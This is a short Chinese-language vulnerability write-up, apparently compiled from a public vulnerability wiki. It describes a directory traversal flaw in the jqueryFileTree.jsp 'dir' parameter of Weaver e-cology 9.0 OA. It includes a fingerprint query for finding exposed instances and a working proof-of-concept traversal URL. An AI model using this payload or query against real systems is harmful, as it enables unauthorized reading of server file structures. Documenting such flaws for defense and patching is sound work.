---
title: "泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞"
date: 2026-10-17 09:12:29
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "代码执行"
  - "目录遍历"
  - "漏洞复现"
---
## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息

## 漏洞影响

```
泛微e-cology 9.0
```

## 网络测绘

```
app="泛微-协同办公OA"
```

## 漏洞复现

登录页面

![1](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131045944.png)

验证POC

```
/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
```

![2](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202209131046623.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Cology-jqueryFileTree.jsp-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E.md)
